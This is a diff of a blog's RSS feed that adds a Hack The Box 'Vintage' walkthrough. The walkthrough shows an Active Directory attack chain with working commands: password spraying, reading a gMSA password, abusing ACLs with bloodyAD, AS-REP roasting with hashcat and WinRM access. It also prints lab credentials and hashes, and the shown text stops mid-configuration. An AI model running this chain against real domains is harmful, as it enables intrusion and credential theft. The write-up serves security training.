@@ -1,4 +1,722 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Home | 0xseclab</title><link>http://localhost:1313/</link><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml"/><description>Home</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Tue, 24 Oct 2023 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu10549305016715957011.png</url><title>Home</title><link>http://localhost:1313/</link></image><item><title>About Me</title><link>http://localhost:1313/about/</link><pubDate>Mon, 05 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/about/</guid><description>&lt;p>I&amp;rsquo;m a Penetration Tester with over two years of hands-on experience in offensive security. I specialize in proactively identifying and mitigating vulnerabilities before they can be exploited by threat actors.&lt;/p>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Home | 0xseclab</title><link>http://localhost:1313/</link><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml"/><description>Home</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Tue, 24 Oct 2023 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu10549305016715957011.png</url><title>Home</title><link>http://localhost:1313/</link></image><item><title>Vintage</title><link>http://localhost:1313/blog/vintage-htb/</link><pubDate>Sat, 10 May 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/vintage-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
+VINTAGE-HTB-ACTIVE DIRECTORY
+&lt;/div>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./Vintage.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="1-nmap-scan">1. &lt;strong>NMAP-SCAN&lt;/strong>:&lt;/h2>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="initial-access-was-given">Initial Access was given:&lt;/h3>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>Username:&lt;/code>&lt;em>P.Rosa&lt;/em>
+&lt;code>Password:&lt;/code> &lt;strong>Rosaisbest123&lt;/strong>&lt;/p>
+&lt;p>We ran bloodhound python to a get view of active directory.&lt;/p>
+&lt;h2 id="2-bloodhound-python-">2. &lt;strong>BLOODHOUND-PYTHON&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo bloodhound-python -u &lt;span class="s2">&amp;#34;P.Rosa&amp;#34;&lt;/span> -p &lt;span class="s2">&amp;#34;Rosaisbest123&amp;#34;&lt;/span> -d vintage.htb -c all --zip -ns 10.10.11.45
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-2.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-3.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>In bloodhound we checked:&lt;/p>
+&lt;p>&lt;code>Group Membership &amp;gt; Unrolled Member Of&lt;/code>&lt;/p>
+&lt;h3 id="what-is-unrolled-group-members-">What is Unrolled Group members ?&lt;/h3>
+&lt;p>Unrolled members include users or groups that are &lt;strong>indirectly members of a group&lt;/strong> due to group nesting.&lt;/p>
+&lt;p>&lt;em>For example:&lt;/em>&lt;/p>
+&lt;ul>
+&lt;li>Group Team1 is added to Admins.&lt;/li>
+&lt;li>User Bob is a direct member of Team1&lt;/li>
+&lt;li>Bob becomes an unrolled member of Admins because of group nesting&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-4.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We can see that, Unrolled Member Of Domain Users have One Strange Group Which is PRE-WINDOWS 2000 COMPATIBLE &lt;code>ACCESS@VINTAGE.HTB&lt;/code>&lt;/p>
+&lt;p>Upon researching about the Pre-Windows 2000 we found:&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-5.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>This means that there will be a Computer in this Group which will have a password same of its username&lt;/code>&lt;/p>
+&lt;p>So we need to check PRE-WINDOWS 2000 COMPATIBLE &lt;code>ACCESS@VINTAGE.HTB&lt;/code> Members&lt;/p>
+&lt;ol>
+&lt;li>Click On PRE-WINDOWS 2000 COMPATIBLE &lt;code>ACCESS@VINTAGE.HTB&lt;/code>&lt;/li>
+&lt;li>Check its Direct Members&lt;/li>
+&lt;/ol>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-6.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We found &lt;code>FS01.VINTAGE.HTB&lt;/code>. So possibly it will have the same password of its username. First, We check its name in Bloodhound:&lt;/p>
+&lt;ul>
+&lt;li>Click FS01.VINTAGE.HTB&lt;/li>
+&lt;li>Node Info &amp;gt; Extra Properties
+&lt;ul>
+&lt;li>SameAccountName: FS01$&lt;/li>
+&lt;li>serviceprincipalnames: RestrictedKrbHost/fs01 HOST/fs0&lt;/li>
+&lt;li>RestrictedKrbHost/FS01.vintage.htb HOST/FS01.vintage.htb&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;p>From the node Info &lt;strong>ServicePrincipalname&lt;/strong> gives an hint of Kerberoast attack but we will first check it via Netexec&lt;/p>
+&lt;h2 id="3-password-spraying-via-netexec">3. &lt;strong>PASSWORD SPRAYING VIA NETEXEC&lt;/strong>:&lt;/h2>
+&lt;p>We first sprayed with winrm, wmi but both didn’t worked and gave error via netexec and crackmapexec. Then we tried ldap just to verify our password is correct for FS01$. Also Remember User -k &lt;code>Since ntlm authentication is disable in this case&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo netexec ldap  10.10.11.45 -u usernames.txt -p passwords.txt -k --continue-on-success
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-7.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Output verifies our password for FS01$ is indeed correct. &lt;strong>Alhamdulillah&lt;/strong>&lt;/p>
+&lt;h2 id="4-generating-ticket-via-impacket-gettgt-via-fs01-credentials-">4. &lt;strong>GENERATING TICKET VIA IMPACKET-getTGT VIA FS01$ CREDENTIALS&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/FS01&lt;span class="se">\$&lt;/span>:fs01 -dc-ip vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-8.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Kerberos based attacks require synchronization of time with the Remote server.&lt;/p>
+&lt;p>The &lt;code>ntpdate&lt;/code> command is used to manually synchronize the system clock with a remote NTP (Network Time Protocol) server. It sets the local date and time by querying the NTP server and is typically used for one-time time synchronization, not continuous syncing&lt;/p>
+&lt;p>Hence, we need to configure the ntp:&lt;/p>
+&lt;ol>
+&lt;li>sudo mousepad &lt;strong>/etc/ntp.conf&lt;/strong>&lt;/li>
+&lt;li>sudo ntpdate 10.10.11.45&lt;/li>
+&lt;li>sudo mousepad &lt;strong>/etc/krb5user.conf&lt;/strong>&lt;/li>
+&lt;li>&lt;code>export KRB5CCNAME=$PWD/'FS01$.ccache'&lt;/code>&lt;/li>
+&lt;li>klist&lt;/li>
+&lt;/ol>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-9.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="5-bloodhound-as-fs01-">5. &lt;strong>BLOODHOUND AS FS01$&lt;/strong> :&lt;/h2>
+&lt;ul>
+&lt;li>Bloodhound again &amp;gt; Check &lt;code>FS01@VINTAGE.HTB&lt;/code>&lt;/li>
+&lt;li>Check Outbound Object Control &amp;gt; Group Delegated Object Control&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-10.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We can see,
+&lt;strong>FS01 is a member of DOMAIN &lt;code>COMPUTERS@VINTAGE.HTB&lt;/code> where domain computers group can ReadGMSAPassword. So with the FS01 Creds (ccache in our case) we can ReadGMSAPassword&lt;/strong>&lt;/p>
+&lt;h2 id="6-reading-gmsapassword-via-bloodyad-with-as-fs01-ccache-">6. &lt;strong>READING GMSAPASSWORD VIA BLOODYAD WITH AS FS01$ CCACHE&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k &lt;span class="nv">ccache&lt;/span>&lt;span class="o">=&lt;/span>~/hackthebox-vms/vintage/FS01&lt;span class="se">\$&lt;/span>.ccache --dc-ip &lt;span class="s2">&amp;#34;10.10.11.45&amp;#34;&lt;/span> get object &lt;span class="s1">&amp;#39;CN=GMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb&amp;#39;&lt;/span> --attr &lt;span class="s1">&amp;#39;msDS-ManagedPassword&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-11.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>**msDS-ManagedPassword.NTLM:&lt;/code> &lt;strong>aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7&lt;/strong>&lt;/p>
+&lt;p>We can pass the hash now since we have the ntlm hash of GMSA&lt;/p>
+&lt;h2 id="7-bloodhound-again-for-gmsa-nodes-and-membership-">7. **BLOODHOUND AGAIN FOR GMSA NODES AND MEMBERSHIP :&lt;/h2>
+&lt;p>&lt;code>Outbound Object Control &amp;gt; First Degree Object Control&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-12.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-13.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>GMSA01$@VINTAGE.HTB HAS GENERICWRITE ACCESS OVER SERVICEMANAGERS@VINTAGE.HTB&lt;/code>&lt;/p>
+&lt;p>Since the box is based on Kerberos authentication, and NTLM is disabled so we need to convert the credentials into Kerberos TGT ccache&lt;/p>
+&lt;h2 id="8-gmsa01-credentials-into-kerberos-ticket-tgt-via-impacket-gettgt-">8. &lt;strong>GMSA01$ CREDENTIALS INTO KERBEROS TICKET (TGT) VIA IMPACKET-getTGT&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/&lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span> -hashes **aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7** -dc-ip vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-14.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>export KRB5CCNAME=$PWD/'GMSA01$.ccache'&lt;/code>&lt;/li>
+&lt;li>klist&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-15.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="9-abusing-genericwrite-access-over-servicemanagersvintagehtb-with-kerberos-ticket-">9. &lt;strong>ABUSING GENERICWRITE ACCESS OVER &lt;code>SERVICEMANAGERS@VINTAGE.HTB&lt;/code> WITH KERBEROS TICKET&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k add groupMember &lt;span class="s2">&amp;#34;ServiceManagers&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;GMSA01&lt;/span>$&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-16.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>Since we have added the GMSA01$ to the ServiceManagers we need to renegerate a new TGT for GMSA01$ which will have that GroupManagers access in it.&lt;/p>
+&lt;h2 id="10-regenerating-gmsa01-credentials-as-kerberos-ticket-tgt-via-impacket-gettgt-">10. &lt;strong>REGENERATING GMSA01$ CREDENTIALS AS KERBEROS TICKET (TGT) VIA IMPACKET-getTGT&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/&lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span> -hashes **aad3b435b51404eeaad3b435b51404ee:cfa9f6edd15de88ae7a9652114e3f4a7** -dc-ip vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>export KRB5CCNAME=$PWD/'GMSA01$.ccache'&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-17.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="11-bloodhound-again-as-servicemanagers-">11. &lt;strong>BLOODHOUND AGAIN AS SERVICEMANAGERS&lt;/strong> :&lt;/h2>
+&lt;ul>
+&lt;li>Outbound object control &amp;gt; first degree object control&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-18.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We see ServiceMangers have GenericAll Access over 3 Users. Since GMSA01$ is what we added it into that ServiceManagers group so he will also have that GenericAll Access over these 3 machines.&lt;/p>
+&lt;ul>
+&lt;li>We checked &lt;strong>Sql_svc&lt;/strong>, but found out its disabled account&lt;/li>
+&lt;/ul>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-19.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>First enable it then we can change the password of &lt;strong>sql_svc&lt;/strong>&lt;/p>
+&lt;h2 id="12-enabling-sql_svc-via-gmsa01-">12. &lt;strong>ENABLING SQL_SVC VIA GMSA01$&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k add uac &lt;span class="s2">&amp;#34;svc_sql&amp;#34;&lt;/span> -f &lt;span class="s2">&amp;#34;NORMAL_ACCOUNT&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-20.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="13-abusing-genericall-on-sql_svc-via-gmsa01-">13. &lt;strong>ABUSING GENERICALL ON SQL_SVC VIA GMSA01&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host &lt;span class="s2">&amp;#34;dc01.vintage.htb&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;vintage.htb&amp;#34;&lt;/span> -k add genericAll SVC_SQL &lt;span class="s1">&amp;#39;GMSA01$&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-21.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="14-extracting-usernames-via-ldapsearch-">14. &lt;strong>EXTRACTING USERNAMES VIA LDAPSEARCH&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ldapsearch -x -H ldap://10.10.11.45 -D &lt;span class="s2">&amp;#34;P.Rosa@vintage.htb&amp;#34;&lt;/span> -w &lt;span class="s2">&amp;#34;Rosaisbest123&amp;#34;&lt;/span> -b &lt;span class="s2">&amp;#34;DC=vintage,DC=htb&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;(objectClass=user)&amp;#34;&lt;/span> sAMAccountName &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;sAMAccountName:&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> cut -d &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span> -f &lt;span class="m">2&lt;/span> &amp;gt; usernames.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-22.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="15-attempting-kerberos-for-finding-any-hash">15. &lt;strong>ATTEMPTING KERBEROS FOR FINDING ANY HASH&lt;/strong>:&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-23.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="16-adding-dont-require-preauth-set-">16. &lt;strong>ADDING DON’T REQUIRE PREAUTH SET&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodyAD --host dc01.vintage.htb -d &lt;span class="s2">&amp;#34;VINTAGE.HTB&amp;#34;&lt;/span> --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="17-impacket-getnpusers-again-">17. &lt;strong>IMPACKET-GETNPUSERS (AGAIN)&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-24.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>&lt;code>$krb5asrep$23$svc_sql@VINTAGE.HTB:49d7a4e87c381d43ece06049320d233d$4e789eb6c6fc9891c14adafc39b2b742582fdff7f9fa6af972b4dbdf8a46197ea7546be882ad97fdf5a1c2e2e091b8182bcc259daa05db472dde5fcd3c4b952ef8fbaeecf7862c4824d95ac689810d8bd4adab5bb3cb1f70cd74b902a5abae08c6709e2cc8da7785e76de597b5307cb680d38199df63d88d3efee9e8c05189572be001470f7bec31855eb79a3a054d47a7815d0bcef15addbbf631c230fd4a3f3bcd10fee4c85ff5c340da8b28f94a1adbcac6dacc3b83f2222e37dde0a1ab52949376359ad1df5598ab0ca30fab89aa139ceb6cca535acfbff542f0a9aef312e20acc4679675710b682&lt;/code>&lt;/p>
+&lt;p>We got the asrep hash of SQL_SVC which we can crack it.&lt;/p>
+&lt;h2 id="18-cracking-via-hashcat-">18. &lt;strong>CRACKING VIA HASHCAT&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hashcat --help &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;rep&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hashcat -m &lt;span class="m">18200&lt;/span> sql_svc.hash  /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best64.rule
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-25.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-26.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We got, &lt;code>sql_svc&lt;/code> password: &lt;strong>Zer0the0ne&lt;/strong>&lt;/p>
+&lt;h2 id="19-password-spraying-via-kerbrute-">19. &lt;strong>PASSWORD SPRAYING VIA KERBRUTE&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">./kerbrute_linux_amd64 --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-27.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We got the,
+&lt;code>Username:&lt;/code> &lt;strong>C.Neri&lt;/strong>
+&lt;code>Password:&lt;/code> &lt;strong>Zer0the0ne&lt;/strong>&lt;/p>
+&lt;h2 id="20-bloodhound-for-cneri-">20. &lt;strong>BLOODHOUND FOR C.NERI&lt;/strong> :&lt;/h2>
+&lt;p>Outbound Object Control &amp;gt; Group Delegated Object Control&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-28.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h2 id="21-generating-ticket-via-impacket-gettgt-with-cneri-creds-">21. &lt;strong>GENERATING TICKET VIA IMPACKET-getTGT WITH C.NERI CREDS&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>export KRB5CCNAME=$PWD/'c.neri.ccache'&lt;/code>&lt;/p>
+&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-30.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;h3 id="attempt-evil-winrm-as-cneri-">&lt;strong>ATTEMPT EVIL-WINRM AS C.NERI :&lt;/strong>&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">evil-winrm -i dc01.vintage.htb -r vintage.htb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;figure >
+&lt;div class="flex justify-center ">
+&lt;div class="w-100" >&lt;img src="./image-31.png" alt="" loading="lazy" data-zoomable />&lt;/div>
+&lt;/div>&lt;/figure>
+&lt;/p>
+&lt;p>We got an error. This is because of Krb5.conf hasn&amp;rsquo;t been configured. So lets configured that.&lt;/p>
+&lt;h2 id="22-updating-krb5conf-">22. &lt;strong>UPDATING KRB5.CONF&lt;/strong> :&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo mousepad /etc/krb5.conf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>libdefaults&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">default_realm&lt;/span> &lt;span class="o">=&lt;/span> VINTAGE.HTB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">dns_lookup_kdc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">dns_lookup_realm&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">false&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">ticket_lifetime&lt;/span> &lt;span class="o">=&lt;/span> 24h
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">renew_lifetime&lt;/span> &lt;span class="o">=&lt;/span> 7d
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">    &lt;span class="nv">forwardable&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">true&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
